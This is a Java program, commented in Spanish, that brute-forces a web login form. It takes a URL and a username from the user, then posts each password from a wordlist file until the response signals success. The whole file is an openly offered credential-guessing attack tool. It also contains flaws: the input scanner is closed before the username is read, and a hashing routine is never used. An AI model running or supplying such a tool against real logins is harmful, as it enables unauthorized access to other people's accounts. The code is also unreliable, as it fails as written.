package Password_Cracking;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class Password_Cracking {
    private static final String HASH_ALGORITHM = "SHA-256";
    private static final String FILENAME = "wordlist.txt";

    public static void main(String[] args) {
        // Obtén la URL del formulario de login desde el usuario
        Scanner scanner = new Scanner(System.in);
        System.out.print("Introduce la URL del formulario de login: ");
        String loginUrl = scanner.nextLine();
        scanner.close();

        // Obtén el nombre de usuario desde el usuario
        System.out.print("Introduce el nombre de usuario: ");
        String username = scanner.nextLine();

        // Inicia el proceso de fuerza bruta de contraseñas
        bruteForcePasswords(loginUrl, username);
    }

    private static void bruteForcePasswords(String loginUrl, String username) {
        // Obtén la lista de contraseñas desde el archivo wordlist.txt
        List<String> passwords = loadPasswords();

        // Itera sobre las contraseñas y prueba cada una
        for (String password : passwords) {
            // Realiza el envío de la solicitud HTTP POST al formulario de login
            boolean loginSuccessful = performLogin(loginUrl, username, password);

            // Verifica si el login fue exitoso
            if (loginSuccessful) {
                System.out.println("Contraseña encontrada: " + password);
                return; // Si se encuentra la contraseña, se termina el programa
            }
        }

        System.out.println("No se encontró la contraseña en la lista.");
    }

    private static boolean performLogin(String loginUrl, String username, String password) {
        try {
            // Crea la conexión HTTP y configura los parámetros necesarios
            URL url = new URL(loginUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);

            // Configura los parámetros de la solicitud (nombre de usuario, contraseña, etc.)
            String parameters = "username=" + username + "&password=" + password;
            connection.getOutputStream().write(parameters.getBytes());

            // Envía la solicitud y obtén la respuesta
            int responseCode = connection.getResponseCode();

            // Verifica si el login fue exitoso analizando la respuesta
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String line;
                StringBuilder response = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                
                reader.close();
                
                // Lógica de verificación de éxito del login
                String responseBody = response.toString();
                if (responseBody.contains("login_success")) {
                    // El login fue exitoso
                    return true;
                } else {
                    // El login no fue exitoso
                    return false;
                }
            } else {
                return false; // El login no fue exitoso
            }
        } catch (Exception e) {
            return false; // Manejo de errores y excepciones
        }
    }

    private static List<String> loadPasswords() {
        List<String> passwords = new ArrayList<>();

        try (BufferedReader br = new BufferedReader(new FileReader(FILENAME))) {
            String line;
            while ((line = br.readLine()) != null) {
                passwords.add(line);
            }
        } catch (Exception e) {
            System.out.println("Error al cargar las contraseñas: " + e.getMessage());
        }

        return passwords;
    }

    private static String hashPassword(String password) {
        try {
            MessageDigest digest = MessageDigest.getInstance(HASH_ALGORITHM);
            byte[] hashedBytes = digest.digest(password.getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (byte b : hashedBytes) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            System.out.println("Error al generar el hash de la contraseña: " + e.getMessage());
            return null;
        }
    }
}

